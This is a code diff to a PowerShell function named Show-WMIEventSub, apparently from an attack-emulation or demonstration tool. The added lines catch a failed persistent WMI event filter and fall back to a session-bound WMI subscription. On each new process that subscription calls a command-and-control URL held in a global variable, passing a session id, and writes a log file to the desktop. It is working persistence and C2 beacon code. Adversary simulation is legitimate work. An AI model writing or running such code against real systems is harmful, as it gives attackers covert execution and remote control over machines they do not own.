@@ -552,7 +552,51 @@ function Show-WMIEventSub {
             Write-Host "    [OK] Event Filter created." -ForegroundColor Green
         }
         catch {
-            Write-Error "    [!] Failed to create Event Filter: $($_.Exception.Message)"
+            $errMsg = $_.Exception.Message
+            Write-Warning "    [!] Class-based persistent creation failed: $errMsg"
+            Write-Host "    [*] Attempting session-based (non-persistent) fallback using Register-CimIndicationEvent/Register-WmiEvent." -ForegroundColor Yellow
+
+            # Prepare session-based fallback variables
+            $query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'"
+            $source = "DemoWmi_$($Global:UniqueId)"
+            $c2Url = $Global:C2Url
+            $sid = $Global:UniqueId
+            $dp = $desktopPath
+
+            $action = {
+                try {
+                    Invoke-RestMethod -Uri "$using:c2Url/?message=how-are-you-session=$using:sid" -Method Get -ErrorAction SilentlyContinue
+                    Add-Content -Path (Join-Path $using:dp 'calcLOG.txt') -Value 'Successfully executed payload via WMI.' -ErrorAction SilentlyContinue
+                } catch { }
+            }
+
+            if (Get-Command -Name Register-CimIndicationEvent -ErrorAction SilentlyContinue) {
+                try {
+                    Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action $action -ErrorAction Stop
+                    Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
+                    Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
+                    return
+                }
+                catch {
+                    Write-Error "    [!] Failed to register session-based CIM subscription: $($_.Exception.Message)"
+                    return
+                }
+            }
+
+            if (Get-Command -Name Register-WmiEvent -ErrorAction SilentlyContinue) {
+                try {
+                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action $action -Namespace 'root\cimv2' -ErrorAction Stop
+                    Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
+                    Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
+                    return
+                }
+                catch {
+                    Write-Error "    [!] Failed to register session-based WMI subscription: $($_.Exception.Message)"
+                    return
+                }
+            }
+
+            Write-Error "    [!] No session-based registration cmdlets available; cannot create WMI subscription on this host." 
             return
         }
 
